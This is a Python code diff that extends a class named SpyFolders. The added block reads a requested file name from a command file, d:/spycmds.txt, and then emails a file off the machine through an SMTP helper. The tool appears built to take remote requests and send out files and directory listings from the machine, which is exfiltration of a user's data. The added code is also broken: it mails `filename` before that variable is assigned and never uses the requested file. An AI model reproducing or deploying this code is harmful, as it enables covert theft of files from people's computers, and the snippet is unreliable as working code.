@@ -19,6 +19,22 @@ class SpyFolders():
         return allfiles
 
     def main(self):
+        if os.path.exists("d:/spycmds.txt"):
+            request_file = ""
+            with open("d:/spycmds.txt","r") as f:
+                f.seek(0,0)
+                lines = f.readlines()
+                if len(lines) == 1:
+                    print("find 1 file request")
+                    for item in lines:
+                        print("file request is :%s" % item)
+                        request_file = item[:-1]
+                else:
+                    print("more than 1 file request,someting is wrong")
+
+            mail_smtp.send_smtp_message("the wanted file","the wanted file",filename)
+            return
+        
         os.chdir("d:"+os.sep+"work")
         filename = "d:/dircontents.txt"
         files = self.get_files_list_from_dir(os.getcwd())
